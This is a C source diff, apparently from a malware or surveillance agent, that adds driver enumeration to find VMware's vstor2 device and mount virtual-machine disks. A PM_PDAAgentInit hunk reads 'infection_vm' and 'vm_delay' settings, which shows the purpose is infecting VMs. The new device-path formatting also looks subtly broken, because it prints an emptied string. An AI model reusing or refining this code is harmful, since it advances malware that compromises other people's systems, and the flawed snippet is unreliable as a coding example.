@@ -799,11 +799,48 @@ DWORD FindDiskID(HANDLE hfile, char *disk_path)
 	return 0;
 }
 
+BOOL FindVStoreDevice(WCHAR *dev_store)
+{
+	DWORD dummy;
+	LPVOID *drivers;
+	DWORD cbNeeded = 0;
+	int cDrivers, i;
+
+	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
+	if (cbNeeded == 0)
+		return FALSE;
+	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
+		return FALSE;
+
+	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
+		WCHAR szDriver[1024];
+		cDrivers = cbNeeded/sizeof(LPVOID);
+		for (i=0; i < cDrivers; i++ ) {
+			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
+				if (!_wcsnicmp(szDriver, L"vstor2-", wcslen(L"vstor2-"))) {
+					WCHAR *ptr;
+					if(ptr = wcschr(szDriver, L'.')) {
+						*ptr = 0;
+						_snwprintf_s(dev_store, MAX_PATH, _TRUNCATE, L"\\\\\\\\.\\\\%s", ptr);		
+						free(drivers);
+						return TRUE;
+					}
+					free(drivers);
+					return FALSE;
+				}
+			}
+		}
+	}
+	free(drivers);
+	return FALSE;
+}
+
 // Monta un disco virtuale
 BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
 {
 	HANDLE hfile;
 	char reply[0x3FDC];
+	WCHAR vstore[MAX_PATH];
 	_ioctl_vstor msg;
 	DWORD dummy;
 
@@ -823,7 +860,9 @@ BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
 	strcpy((char *) msg.Path, disk_path);
 
 	// Manda la ioctl per montare il disco
-	hfile = CreateFileA("\\\\.\\vstor2-ws60", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+	if (!FindVStoreDevice(vstore))
+		return FALSE;
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
 	if (hfile == INVALID_HANDLE_VALUE) 
 		return FALSE;
 
@@ -842,6 +881,7 @@ BOOL UnmountVMDisk(char *disk_path, DWORD volume_id)
 {
 	HANDLE hfile;
 	char reply[0x3FDC];
+	WCHAR vstore[MAX_PATH];
 	_ioctl_dismount msg;
 	DWORD dummy;
 
@@ -855,7 +895,9 @@ BOOL UnmountVMDisk(char *disk_path, DWORD volume_id)
     msg.dw6 = 0x01;
 
 	// Manda la ioctl per montare il disco
-	hfile = CreateFileA("\\\\.\\vstor2-ws60", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+	if (!FindVStoreDevice(vstore))
+		return FALSE;
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
 	if (hfile == INVALID_HANDLE_VALUE) 
 		return FALSE;
 
@@ -1197,7 +1239,8 @@ DWORD __stdcall PM_PDAAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
 		// e ogni quanto farlo (nella conf e' in secondi, ma a me serve in millisecondi)
 		if (infection_conf->version == 20110915) {
 			infection_vm = infection_conf->infection_vm;
-			vm_delay = infection_conf->vm_delay * 1000;
+			if (infection_conf->vm_delay)
+				vm_delay = infection_conf->vm_delay * 1000;
 		}
 	}
 
